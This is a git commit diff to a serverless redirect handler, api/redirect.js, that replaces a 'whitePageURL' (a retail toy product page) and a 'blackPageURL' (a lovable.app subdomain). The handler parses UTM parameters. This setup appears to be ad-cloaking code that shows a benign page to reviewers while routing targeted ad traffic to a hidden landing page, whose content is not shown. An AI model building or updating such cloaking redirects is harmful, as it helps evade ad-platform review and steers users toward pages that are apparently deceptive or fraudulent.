32d2e51bd9e7398f43c7fecdcd1cd151fc572351
abdullahch3332 <abdullahch3332@gmail.com>
2025-11-03 08:16:00 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.otto.de/p/filsko-kramfors-winter-filz-hausschuhe-fuer-herren-hausschuh-mit-reissverschluss-S06250MH/";
-    const blackPageURL = "https://instentquzzz.lovable.app/?";
+    const whitePageURL = "https://www.kindermaxx.de/en/toys/baby-toys/cuddly-toys-blankets/konges-sloejd-cuddle-toy-pony-fiona-40-cm?c=1223";
+    const blackPageURL = "https://msgurupml.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
